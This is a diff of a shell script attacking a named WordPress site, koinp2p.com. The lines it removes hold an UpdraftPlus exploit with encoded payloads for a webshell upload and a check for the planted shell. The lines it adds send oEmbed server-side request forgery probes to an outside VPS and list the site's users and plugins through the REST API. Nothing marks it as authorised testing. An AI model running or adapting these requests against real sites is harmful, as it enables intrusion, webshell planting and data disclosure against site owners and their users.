@@ -13,32 +13,32 @@ SSRF() {
 
 echo "IP: $(curl -s https://ifconfig.me)"
 
-# Test 1: CVE ping exploit
-echo "=== CVE PING ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=02cQ1ZFLTIwMjYtMTA3OTUtTEFCLUJBRC1SU0EtQkxPQ0s%3D0000000000000080jawC5lksslKOx1zulgWwjxdAQGl0B%2BNnTpa1abnh1WH8xAFtQg4aUKgAbP0m17NgcDxVjbJRbgSsIIFW3fiUxPDuHs7JSrAS56P8oKbhGwmgcPLXJZ75WaC0Ih9ml2ko"
+# Test 1: WP oEmbed SSRF (parse-embed fetches URL server-side)
+echo "=== OEMBED SSRF TO VPS ==="
+SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=parse-embed&post=1&shortcode=%5Bembed%5Dhttp%3A%2F%2F64.227.62.83%3A8888%2Foembed-ssrf%5B%2Fembed%5D"
 echo ""
 
-# Test 2: CVE upload exploit (webshell)
-echo "=== CVE UPLOAD ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=02cQ1ZFLTIwMjYtMTA3OTUtTEFCLUJBRC1SU0EtQkxPQ0s%3D000000000000026ctLEZlBO3Ev7DGVLTNpYPFjvPcqoGq%2Bk%2BdDGiYNgNhCypk826ZGUbYU1ePb8lIelwwEg6sQe%2FBN7kv4OLI3Dvt02Jc1b57dRrFARxlbxmtrR4zq1jVDo2jOnvaZPd0%2B5sg8%2BXNezlr6sGAMA4%2FeQT3FgrvhJTiU0gW7NjzcGTbOPm2%2FdFHckWD%2B%2F830%2BqZJK9sI4hicI8j13EHO0YXLygASh%2BJi30P2ekcUkPU52pjVl2pRXRDTxP0GtUYhndUmaovFVbqPG5aDdQUs63uiCCn%2FDdFOnIl1wCZbwO%2F574FjlHjikMQkeKcmI%2FMh13%2FETdU%2Frt3Ixdgc%2B1v9s%2BqHHYNfQ74IgHVKEpo8pxsQJX1yD2CjJJrkKHbO%2Fh%2BQSgiS7z6GRHkhUTZWgZFx5VadpFE9ECKNJUwCIZV1MjHT8g3dKKZrcJLtW0lIQ0Hdg7U%2Bylzp7rT5jbtS4d3lajt7dEbyrztJec9bfyF%2Byo5EQzPz%2F1L36KffhMNfPsarNf4CGAsVsadS66%2FyHbBoqGWAzS%2Ftib%2Bc%2FyUlKgG1szD1xC0z%2BEMDsExsIRDw3QbbGiDwigNo2%2Frr1wQcChrX6aruO3bIZgy%2F2dIPhdmomwM3lW%2FKk%3D"
+# Test 2: WP REST API oembed proxy  
+echo "=== REST OEMBED ==="
+SSRF "https://koinp2p.com/wp-json/oembed/1.0/proxy?url=http%3A%2F%2F64.227.62.83%3A8888%2Frest-oembed"
 echo ""
 
-# Test 3: Check if webshell was uploaded
-echo "=== WEBSHELL CHECK ==="
-SSRF "https://koinp2p.com/wp-content/plugins/test-plugin/test-plugin.php"
+# Test 3: WP oEmbed discover (fetches URL to find oembed endpoint)
+echo "=== OEMBED DISCOVER ==="
+SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=parse-embed&url=http%3A%2F%2F64.227.62.83%3A8888%2Foembed-discover"
 echo ""
 
-# Test 4: admin-ajax heartbeat comparison
-echo "=== HEARTBEAT ==="
-SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat"
+# Test 4: Direct admin-ajax SSRF actions
+echo "=== WP CRON ==="
+SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
 echo ""
 
-# Test 5: wp-login reachability
-echo "=== WP-LOGIN ==="
-SSRF "https://koinp2p.com/wp-login.php"
+# Test 5: wp-json users (info disclosure)
+echo "=== WP USERS ==="
+SSRF "https://koinp2p.com/wp-json/wp/v2/users"
 echo ""
 
-# Test 6: xmlrpc
-echo "=== XMLRPC ==="
-SSRF "https://koinp2p.com/xmlrpc.php"
+# Test 6: wp-json plugins (if accessible)
+echo "=== WP PLUGINS ==="
+SSRF "https://koinp2p.com/wp-json/wp/v2/plugins"
 echo ""
